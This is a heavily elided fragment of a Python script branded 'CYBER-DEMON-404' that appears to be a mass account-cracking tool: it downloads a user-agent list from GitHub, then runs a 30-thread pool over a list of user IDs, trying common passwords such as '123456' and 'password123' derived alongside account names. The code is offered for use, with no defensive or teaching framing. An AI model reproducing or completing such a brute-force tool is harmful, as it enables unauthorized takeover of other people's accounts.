...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mCYBER-DEMON-404')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/DavidChinedu23/ua/blob/main/ua2.txt').text
		ua=open('ua2.txt','w')
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['123456','445566','123456789','12345678','102030','password123','username','Password']
			if len(nmf)<15:
				if len(frs)<=9:
					pass
				else:
